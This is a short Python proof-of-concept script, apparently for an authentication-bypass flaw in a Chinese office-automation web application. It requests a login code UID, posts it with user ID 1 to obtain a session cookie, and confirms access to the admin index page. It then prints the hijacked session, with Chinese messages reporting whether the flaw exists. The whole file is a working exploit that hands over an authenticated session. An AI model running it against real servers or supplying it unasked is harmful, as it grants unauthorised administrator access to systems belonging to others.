#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re
from random import choice
import urllib
import time


urllib3.disable_warnings()


def verify(site):
    checkUrl = urllib.parse.urljoin(site, '/general/login_code.php')
    try:
        headers = {}
        headers["User-Agent"] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"
        res = requests.get(checkUrl, headers=headers, timeout=5, verify=False)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = urllib.parse.urljoin(site, '/logincheck_code.php')
        res = requests.post(getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)}, headers=headers, timeout=3, verify=False)
        tmp_cookie = res.headers['Set-Cookie']
        headers["Cookie"] = tmp_cookie
        check_available = requests.get(urllib.parse.urljoin(site, '/general/index.php'), headers=headers, timeout=5, verify=False)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                return tmp_cookie
    except:
        print(sys.exc_info())
        pass
        
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，登录成功的 session 为：", info)
    else:
        print("[-]漏洞不存在")
